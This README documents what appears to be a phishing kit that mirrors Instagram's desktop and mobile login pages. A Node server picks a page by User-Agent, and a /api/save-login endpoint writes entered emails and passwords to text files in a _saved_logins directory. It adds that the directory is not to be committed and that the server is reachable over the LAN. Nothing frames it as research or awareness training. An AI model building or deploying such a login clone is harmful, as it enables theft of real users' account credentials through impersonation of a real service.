# Instagram Login Page Mirror

Static mirror of Instagram's web login page. No build tools, no package managers, no tests, no CI.

## Run

```
node server.js
```

Open `http://localhost:3000`.

## How it works

- `server.js` — Node HTTP server on port 3000. Routes `/` based on User-Agent: desktop → `index.html`, mobile → `indexm.html`. `indexmobile.html` is not served by the server (fetch it directly).
- `POST /api/save-login` — saves email/password to `_saved_logins/<sanitized-email>.txt`.
- Static files served from repo root with MIME types for `.html`, `.js`, `.css`, `.json`, `.png`, `.webp`, `.ico`.

## Files

- `index.html` — desktop login page (mirrors Instagram's full desktop login)
- `indexm.html` — mobile login page (custom dark/light theme, served on mobile devices)
- `indexmobile.html` — mobile login page (mirrors Instagram's touch login, not served by default)
- `mainfest.json` — desktop PWA manifest
- `mainfastmobile.json` — mobile PWA manifest
- `image.png`, `meta.png` — assets used by `indexm.html`

## Key details

- `_saved_logins/` dir is created automatically on first login save. Do not commit this directory.
- No env vars needed. No dependencies beyond Node.js built-ins.
- Binding to `0.0.0.0` allows LAN access.
- `mainfest.json` has the intentional typo "mainfest" (not "manifest") — the HTML references `"/data/manifest.json"`, so the server resolves it to `./data/manifest.json` which likely 404s in this repo.
